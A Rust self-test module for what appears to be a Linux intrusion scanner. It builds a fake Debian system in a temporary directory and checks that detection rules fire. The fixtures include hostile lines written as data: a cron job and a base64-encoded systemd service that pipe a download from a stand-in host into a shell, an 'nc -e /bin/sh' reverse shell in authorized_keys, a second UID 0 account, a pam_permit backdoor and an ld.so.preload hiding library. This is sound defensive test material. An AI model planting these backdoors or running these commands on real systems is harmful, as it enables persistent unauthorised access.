//! Safe self-test: builds a made-up Debian system with harmless
//! test artefacts in a temporary directory and checks that the rules fire.
//!
//! Nothing on the real system is read or changed – everything happens in a
//! `tempfile` directory that is removed afterwards.

use crate::baseline::Baseline;
use crate::config::Config;
use crate::modules::net_proc::encode_hex_addr;
use crate::procinfo::PF_KTHREAD;
use crate::report::Report;
use crate::scan::{run_scan, ScanOptions};
use crate::sys::SysRoot;
use anyhow::{Context, Result};
use serde::{Deserialize, Serialize};
use std::fs;
use std::net::SocketAddr;
use std::os::unix::fs::{symlink, PermissionsExt};
use std::path::Path;

/// Rules the self-test expects, with a short explanation.
pub const EXPECTED: [(&str, &str); 36] = [
    ("AUTH-SSH-PUBLIC", "SSH login from an address on the internet"),
    ("FS-TMP-EXEC", "program file hidden in a temporary folder"),
    ("PROC-LD-LIBRARY-PATH", "process with libraries from /tmp"),
    ("PERS-APT-UNSIGNED", "software source without signature check"),
    ("PERS-HISTORY", "shell history that was switched off"),
    ("PERS-DUP-ID", "two accounts with the same UID"),
    ("AUTH-SSH-SUCCESS-AFTER-FAIL", "SSH login that succeeded after many failed attempts"),
    ("AUTH-SSH-BRUTEFORCE", "many failed SSH logins from one address"),
    ("NET-REVSHELL", "bash with fd 0–2 connected to a TCP connection"),
    ("NET-SUSP-PORT", "connection to port 4444"),
    ("NET-TMP-SOCKET", "binary in /tmp holds a listening socket"),
    ("NET-DELETED-SOCKET", "deleted binary holds a socket"),
    ("NET-ORPHAN-LISTEN", "listening port without an owner process"),
    ("NET-HIDDEN-PID", "PID in sched_debug but not in /proc"),
    ("NET-KTHREAD-FAKE", "user process calling itself [kworker]"),
    ("NET-KTHREAD-NAME", "kernel thread with an unknown name"),
    ("NET-ARGV0-MASK", "argv[0] does not match exe"),
    ("PROC-TMP-EXE", "process runs from /tmp or /var/tmp"),
    ("PROC-DELETED", "the process binary is deleted"),
    ("PROC-MEMFD", "fileless process from memfd"),
    ("PROC-LD-PRELOAD", "process with LD_PRELOAD"),
    ("FS-SUID-TEMP", "SUID file in /tmp"),
    ("FS-SUID-UNKNOWN|FS-SUID-NONROOT", "unknown SUID file (or owned by someone other than root in the sandbox)"),
    ("BASE-SUID-NEW", "new SUID file compared with the baseline"),
    ("BASE-PERSIST-NEW", "new persistence file compared with the baseline"),
    ("PERS-SYSTEMD-EXEC", "systemd service with base64 and a /tmp script"),
    ("PERS-CRON-CMD", "cron job that downloads and runs code"),
    ("PERS-CRON-USER", "user crontab"),
    ("PERS-RC-LOCAL", "rc.local that starts from /dev/shm"),
    ("PERS-LDPRELOAD", "/etc/ld.so.preload is filled in"),
    ("PERS-SSH-COMMAND", "authorized_keys with command="),
    ("PERS-SSH-NOCOMMENT", "SSH key without a comment"),
    ("PERS-SSHD-ROOTLOGIN", "PermitRootLogin yes via Include"),
    ("PERS-SSHD-AKF", "changed AuthorizedKeysFile"),
    ("PERS-PAM-PERMIT", "auth sufficient pam_permit.so"),
    ("PERS-UID0", "extra account with UID 0"),
];

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SelfCheck {
    pub rule: String,
    pub what: String,
    pub passed: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SelfTestResult {
    pub checks: Vec<SelfCheck>,
    pub passed: usize,
    pub failed: usize,
    pub report: Report,
}

fn write(root: &Path, abs: &str, content: &str) -> Result<()> {
    let p = root.join(abs.trim_start_matches('/'));
    if let Some(parent) = p.parent() {
        fs::create_dir_all(parent).with_context(|| format!("mkdir {}", parent.display()))?;
    }
    fs::write(&p, content).with_context(|| format!("write {}", p.display()))
}

fn link(root: &Path, abs: &str, target: &str) -> Result<()> {
    let p = root.join(abs.trim_start_matches('/'));
    if let Some(parent) = p.parent() {
        fs::create_dir_all(parent)?;
    }
    symlink(target, &p).with_context(|| format!("symlink {}", p.display()))
}

fn chmod(root: &Path, abs: &str, mode: u32) -> Result<()> {
    let p = root.join(abs.trim_start_matches('/'));
    fs::set_permissions(&p, fs::Permissions::from_mode(mode)).with_context(|| format!("chmod {}", p.display()))
}

struct FakeProc<'a> {
    pid: u32,
    ppid: u32,
    uid: u32,
    comm: &'a str,
    cmdline: &'a [&'a str],
    exe: Option<&'a str>,
    kthread: bool,
    fds: &'a [(u32, u64)],
    environ: &'a [&'a str],
}

fn fake_proc(root: &Path, p: &FakeProc) -> Result<()> {
    let base = format!("/proc/{}", p.pid);
    let flags = if p.kthread { PF_KTHREAD } else { 0x0040_0100 };
    write(root, &format!("{base}/stat"), &format!("{} ({}) S {} {} {} 0 -1 {} 0 0 0 0 0 0 0 0 20 0 1 0 100 0 0\n", p.pid, p.comm, p.ppid, p.pid, p.pid, flags))?;
    write(
        root,
        &format!("{base}/status"),
        &format!("Name:\t{}\nState:\tS (sleeping)\nTgid:\t{}\nPid:\t{}\nPPid:\t{}\nUid:\t{u}\t{u}\t{u}\t{u}\nGid:\t{u}\t{u}\t{u}\t{u}\n", p.comm, p.pid, p.pid, p.ppid, u = p.uid),
    )?;
    let mut cmd = String::new();
    for a in p.cmdline {
        cmd.push_str(a);
        cmd.push('\0');
    }
    write(root, &format!("{base}/cmdline"), &cmd)?;
    write(root, &format!("{base}/comm"), &format!("{}\n", p.comm))?;
    let mut env = String::new();
    for e in p.environ {
        env.push_str(e);
        env.push('\0');
    }
    write(root, &format!("{base}/environ"), &env)?;
    if let Some(exe) = p.exe {
        link(root, &format!("{base}/exe"), exe)?;
        link(root, &format!("{base}/cwd"), "/")?;
    }
    fs::create_dir_all(root.join(format!("proc/{}/fd", p.pid)))?;
    for (fd, inode) in p.fds {
        link(root, &format!("{base}/fd/{fd}"), &format!("socket:[{inode}]"))?;
    }
    Ok(())
}

fn tcp_line(i: usize, local: &str, remote: &str, state: u8, uid: u32, inode: u64) -> Result<String> {
    let l: SocketAddr = local.parse()?;
    let r: SocketAddr = remote.parse()?;
    Ok(format!(
        "{i:4}: {} {} {state:02X} 00000000:00000000 00:00000000 00000000 {uid:5}        0 {inode} 1 0000000000000000 100 0 0 10 0\n",
        encode_hex_addr(&l),
        encode_hex_addr(&r)
    ))
}

const NET_HEADER: &str = "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode\n";

/// Build the made-up system under `root`.
pub fn build_fixture(root: &Path) -> Result<()> {
    // --- /proc/net
    let mut tcp = String::from(NET_HEADER);
    tcp.push_str(&tcp_line(0, "10.0.0.5:43210", "203.0.113.66:4444", 0x01, 1000, 50001)?);
    tcp.push_str(&tcp_line(1, "0.0.0.0:31337", "0.0.0.0:0", 0x0A, 0, 50002)?);
    tcp.push_str(&tcp_line(2, "0.0.0.0:22", "0.0.0.0:0", 0x0A, 0, 50003)?);
    tcp.push_str(&tcp_line(3, "0.0.0.0:8081", "0.0.0.0:0", 0x0A, 0, 50004)?);
    write(root, "/proc/net/tcp", &tcp)?;
    let mut tcp6 = String::from(NET_HEADER);
    tcp6.push_str(&tcp_line(0, "[::]:22", "[::]:0", 0x0A, 0, 50005)?);
    write(root, "/proc/net/tcp6", &tcp6)?;
    write(root, "/proc/net/udp", NET_HEADER)?;
    write(root, "/proc/net/udp6", NET_HEADER)?;
    write(root, "/proc/sys/kernel/hostname", "sandlada\n")?;
    write(root, "/proc/sys/kernel/osrelease", "6.12.0-test-amd64\n")?;
    write(root, "/etc/os-release", "PRETTY_NAME=\"Debian GNU/Linux 13 (trixie) – sandbox\"\n")?;

    // --- processes
    let procs = [
        FakeProc { pid: 1, ppid: 0, uid: 0, comm: "systemd", cmdline: &["/sbin/init"], exe: Some("/usr/lib/systemd/systemd"), kthread: false, fds: &[], environ: &[] },
        FakeProc { pid: 2, ppid: 0, uid: 0, comm: "kthreadd", cmdline: &[], exe: None, kthread: true, fds: &[], environ: &[] },
        FakeProc { pid: 15, ppid: 2, uid: 0, comm: "kworker/0:1-events", cmdline: &[], exe: None, kthread: true, fds: &[], environ: &[] },
        FakeProc { pid: 16, ppid: 2, uid: 0, comm: "zzevilkmod", cmdline: &[], exe: None, kthread: true, fds: &[], environ: &[] },
        FakeProc { pid: 700, ppid: 1, uid: 0, comm: "sshd", cmdline: &["sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups"], exe: Some("/usr/sbin/sshd"), kthread: false, fds: &[(3, 50003), (4, 50005)], environ: &[] },
        FakeProc { pid: 4101, ppid: 1, uid: 1000, comm: "bash", cmdline: &["bash", "-i"], exe: Some("/usr/bin/bash"), kthread: false, fds: &[(0, 50001), (1, 50001), (2, 50001)], environ: &[] },
        FakeProc { pid: 4102, ppid: 1, uid: 0, comm: "backdoor", cmdline: &["/tmp/.x/backdoor"], exe: Some("/tmp/.x/backdoor (deleted)"), kthread: false, fds: &[(3, 50002)], environ: &[] },
        FakeProc { pid: 4103, ppid: 1, uid: 0, comm: "kw", cmdline: &["[kworker/0:2]"], exe: Some("/var/tmp/kw"), kthread: false, fds: &[], environ: &[] },
        FakeProc { pid: 4104, ppid: 1, uid: 1000, comm: "cupsd", cmdline: &["/usr/sbin/cupsd", "-l"], exe: Some("/opt/tools/miner"), kthread: false, fds: &[], environ: &["PATH=/usr/bin", "LD_PRELOAD=/usr/lib/libhide.so", "LD_LIBRARY_PATH=/tmp/.libs"] },
        FakeProc { pid: 4105, ppid: 1, uid: 0, comm: "3", cmdline: &["payload"], exe: Some("/memfd:payload (deleted)"), kthread: false, fds: &[], environ: &[] },
    ];
    for p in &procs {
        fake_proc(root, p)?;
    }
    write(
        root,
        "/proc/sched_debug",
        "Sched Debug Version: v0.11, 6.12.0-test-amd64 #1\n\ncpu#0, 2400.000 MHz\n  .nr_running                    : 1\n\nrunnable tasks:\n S            task   PID         tree-key  switches  prio     wait-time             sum-exec        sum-sleep\n-------------------------------------------------------------------------------------------------------------\n S         systemd     1      1234.567890      5000   120         0.000000       100.000000         0.000000 0 0 /\n S            sshd   700      1300.000000        90   120         0.000000        10.000000         0.000000 0 0 /\n>R            bash  4101      2345.678901       100   120         0.000000         1.000000         0.000000 0 0 /\n S         hiddend  4242      3456.789012        10   120         0.000000         0.500000         0.000000 0 0 /\n",
    )?;

    // --- accounts
    write(
        root,
        "/etc/passwd",
        "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nsshd:x:100:65534::/run/sshd:/usr/sbin/nologin\nanna:x:1000:1000:Anna,,,:/home/anna:/bin/bash\ntoor:x:0:0::/root:/bin/sh\nshadowanna:x:1000:1000::/home/anna:/bin/bash\n",
    )?;
    fs::create_dir_all(root.join("home/anna"))?;
    fs::create_dir_all(root.join("root"))?;

    // --- systemd
    write(
        root,
        "/etc/systemd/system/backdoor-update.service",
        "[Unit]\nDescription=System update helper\n\n[Service]\nType=simple\nExecStart=/bin/bash -c 'echo Y3VybCBodHRwOi8vMTk4LjUxLjEwMC43L3ggfCBzaA== | base64 -d | bash'\nRestart=always\n\n[Install]\nWantedBy=multi-user.target\n",
    )?;
    link(root, "/etc/systemd/system/multi-user.target.wants/backdoor-update.service", "../backdoor-update.service")?;
    write(
        root,
        "/etc/systemd/system/scanner-dummy.service",
        "[Unit]\nDescription=Harmless test service for the scanner\n\n[Service]\nExecStart=/tmp/scanner-test.sh\n",
    )?;
    write(root, "/usr/lib/systemd/system/ssh.service", "[Service]\nExecStart=/usr/sbin/sshd -D $SSHD_OPTS\n")?;

    // --- cron
    write(root, "/etc/crontab", "SHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n17 *\t* * *\troot\tcd / && run-parts --report /etc/cron.hourly\n")?;
    write(root, "/etc/cron.d/sysupdate", "*/5 * * * * root curl -fsSL http://198.51.100.7/x.sh | sh\n")?;
    write(root, "/etc/cron.daily/dpkg", "#!/bin/sh\n/usr/libexec/dpkg/dpkg-db-backup\n")?;
    write(root, "/var/spool/cron/crontabs/anna", "# user job\n@reboot /home/anna/.cache/.agent --quiet\n")?;

    // --- rc.local and ld.so.preload
    write(root, "/etc/rc.local", "#!/bin/sh -e\n/dev/shm/.k &\nexit 0\n")?;
    chmod(root, "/etc/rc.local", 0o755)?;
    write(root, "/etc/ld.so.preload", "/usr/lib/x86_64-linux-gnu/libprocesshider.so\n")?;

    // --- SSH
    write(root, "/etc/ssh/sshd_config", "Include /etc/ssh/sshd_config.d/*.conf\nPermitRootLogin prohibit-password\nKbdInteractiveAuthentication no\nUsePAM yes\nSubsystem sftp /usr/lib/openssh/sftp-server\n")?;
    write(root, "/etc/ssh/sshd_config.d/99-test.conf", "PermitRootLogin yes\nAuthorizedKeysFile .ssh/authorized_keys /var/tmp/.keys/%u\n")?;
    write(
        root,
        "/root/.ssh/authorized_keys",
        "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl admin@laptop\ncommand=\"nc -e /bin/sh 203.0.113.66 4444\",no-pty ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl\n",
    )?;
    chmod(root, "/root/.ssh/authorized_keys", 0o600)?;

    // --- PAM
    write(root, "/etc/pam.d/common-auth", "auth\t[success=1 default=ignore]\tpam_unix.so nullok\nauth\trequisite\t\t\tpam_deny.so\nauth\trequired\t\t\tpam_permit.so\n")?;
    write(root, "/etc/pam.d/sshd", "@include common-auth\nauth sufficient pam_permit.so\naccount required pam_nologin.so\n")?;

    // --- login log
    let mut auth = String::new();
    for i in 0..12 {
        auth.push_str(&format!("2026-01-02T03:04:{i:02}+01:00 sandbox sshd-session[900]: Failed password for invalid user admin{i} from 203.0.113.66 port 4000{i} ssh2\n"));
    }
    auth.push_str("2026-01-02T03:05:00+01:00 sandbox sshd-session[901]: Accepted password for anna from 203.0.113.66 port 41000 ssh2\n");
    write(root, "/var/log/auth.log", &auth)?;

    // --- software source, shell history and a hidden program
    write(root, "/etc/apt/sources.list.d/extra.list", "deb [trusted=yes] http://198.51.100.7/debian trixie main\n")?;
    write(root, "/root/.bash_history", "ls\nunset HISTFILE\n")?;
    write(root, "/var/tmp/.cache/agent", "\u{7f}ELF dummy program\n")?;
    chmod(root, "/var/tmp/.cache/agent", 0o755)?;

    // --- SUID files
    write(root, "/usr/bin/passwd", "ELF-dummy passwd\n")?;
    chmod(root, "/usr/bin/passwd", 0o4755)?;
    write(root, "/tmp/.rootshell", "ELF-dummy rootshell\n")?;
    chmod(root, "/tmp/.rootshell", 0o4755)?;
    Ok(())
}

/// Add what should show up as "new since the baseline".
pub fn add_post_baseline_artifacts(root: &Path) -> Result<()> {
    write(root, "/usr/local/bin/newsuid", "ELF-dummy new SUID file\n")?;
    chmod(root, "/usr/local/bin/newsuid", 0o4755)?;
    write(root, "/etc/cron.d/late-job", "0 3 * * * root /usr/local/bin/cleanup\n")?;
    Ok(())
}

/// Run the whole self-test in a temporary directory.
pub fn run_self_test(progress: &dyn Fn(&str)) -> Result<SelfTestResult> {
    let dir = tempfile::Builder::new().prefix("scanner-sandbox-").tempdir().context("could not create a temporary directory")?;
    let root = dir.path().join("root");
    fs::create_dir_all(&root)?;
    progress("Building the sandbox with harmless test artefacts …");
    build_fixture(&root)?;

    let sys = SysRoot::new(&root);
    let cfg = Config::default();
    let opts = ScanOptions::default();
    progress("Scanning the sandbox and saving a baseline …");
    let first = run_scan(&sys, &cfg, &opts, &|_| {});
    let baseline_path = dir.path().join("baseline.json");
    Baseline::from_report(&first).save(&baseline_path)?;

    progress("Adding new artefacts and comparing with the baseline …");
    add_post_baseline_artifacts(&root)?;
    let opts2 = ScanOptions { baseline_compare: Some(baseline_path), ..ScanOptions::default() };
    let report = run_scan(&sys, &cfg, &opts2, &|_| {});

    let checks: Vec<SelfCheck> = EXPECTED
        .iter()
        .map(|(rule, what)| SelfCheck { rule: rule.to_string(), what: what.to_string(), passed: rule.split('|').any(|r| report.has_rule(r)) })
        .collect();
    let passed = checks.iter().filter(|c| c.passed).count();
    let failed = checks.len() - passed;
    progress("The self-test is done.");
    Ok(SelfTestResult { checks, passed, failed, report })
}
